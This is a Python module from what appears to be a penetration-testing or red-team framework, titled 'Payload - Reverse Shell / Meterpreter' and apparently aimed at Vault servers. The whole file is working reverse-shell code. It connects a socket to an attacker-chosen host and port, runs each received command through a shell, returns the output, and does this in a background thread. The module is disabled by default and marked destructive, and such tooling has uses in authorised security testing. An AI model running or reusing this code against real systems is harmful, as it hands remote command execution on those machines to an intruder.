from typing import Optional
import subprocess
import socket
import threading
import time
from ..context import ExecutionContext
from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel

class PayloadModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="payload_module.reverse_shell",
            title="Payload - Reverse Shell / Meterpreter",
            risk_level=RiskLevel.DESTRUCTIVE,
            description="Launches a reverse shell or meterpreter payload",
            default_enabled=False,
        )

    def can_run(self, context):
        return bool(getattr(context, "vault_addr", None) and getattr(context, "token", None))

    def execute(self, context, params=None):
        params = params or {}
        payload_type = params.get("payload_type", "reverse_shell")
        lhost = params.get("lhost", "127.0.0.1")
        lport = int(params.get("lport", 4444))
        shell = params.get("shell", "/bin/bash")

        if payload_type == "reverse_shell":
            try:
                def shell_thread():
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((lhost, lport))
                    s.send(b"[+] Connected!\n")
                    while True:
                        data = s.recv(1024)
                        if not data:
                            break
                        proc = subprocess.Popen(shell, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                        out, err = proc.communicate(data)
                        s.send(out + err)
                    s.close()
                t = threading.Thread(target=shell_thread, daemon=True)
                t.start()
                time.sleep(1)
                context.add_finding(
                    title="CRITICAL: Reverse Shell Launched",
                    description=f"Reverse shell connected to {lhost}:{lport}",
                    severity="CRITICAL",
                    evidence={"lhost": lhost, "lport": lport},
                )
                return ExecutionResult(status="success", message=f"Reverse shell launched to {lhost}:{lport}")
            except Exception as e:
                return ExecutionResult(status="error", message=f"Reverse shell failed: {e}")
        else:
            return ExecutionResult(status="error", message="Unsupported payload type")